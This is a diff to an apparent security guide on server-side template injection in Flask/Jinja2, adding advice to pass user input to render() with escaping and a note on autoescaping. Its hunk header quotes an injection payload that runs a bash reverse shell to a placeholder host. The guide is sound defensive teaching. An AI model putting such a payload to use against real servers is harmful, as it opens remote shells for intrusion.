@@ -51,3 +51,22 @@ http://localhost:4444/?username={{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.x
 
 How to prevent it:
 Never let the user provide template content.
+Templates are executable code.
+Do not execute untrusted inputs such as [Jinja2,] templates.
+Instead, pass variables to the ``render()`` method:
+
+
+```python
+import html
+
+@app.route("/")
+def index():
+    username = request.values.get('username')
+    return Jinja2.from_string('Hello  {{username}}').render(
+        username=html.escape(username))
+```
+
+Note that ``Jinja2.from_string()`` **does not** enable autoescaping because it does not assume that the output is HTML.
+Flask's ``render_template_string`` *does* 
+autoescape by default:
+http://flask.pocoo.org/docs/1.0/templating/#jinja-setup
